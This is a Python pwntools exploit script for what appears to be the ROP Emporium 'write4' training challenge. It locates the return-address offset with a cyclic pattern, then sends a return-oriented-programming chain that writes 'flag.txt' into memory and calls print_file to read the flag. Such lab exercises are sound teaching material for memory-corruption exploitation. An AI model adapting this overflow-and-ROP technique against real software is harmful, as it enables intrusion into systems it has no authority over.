from pwn import *

def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-peda
continue
'''.format(**locals())

exe = './write4'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

def find_offset(p):
    payload = cyclic(100)
    p.sendlineafter('>', payload)
    p.wait()
    core = p.corefile
    rsp_value = core.rsp
    pattern = core.read(rsp_value, 4)
    rip_offset = cyclic_find(pattern)
    info('located RIP offset at {a}'.format(a=rip_offset))
    return rip_offset

io = start()

data = 0x00601028
print_file = 0x0000000000400510
mov = 0x0000000000400628
pop_two = 0x0000000000400690
pop_rdi = 0x0000000000400693

rip_offset = find_offset(start())

payload = flat(
    asm('nop') * rip_offset,
    pop_two,
    data,
    'flag.txt',
    mov,
    pop_rdi,
    data,
    print_file
)

io = start()
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

flag = io.recv()
success(flag)
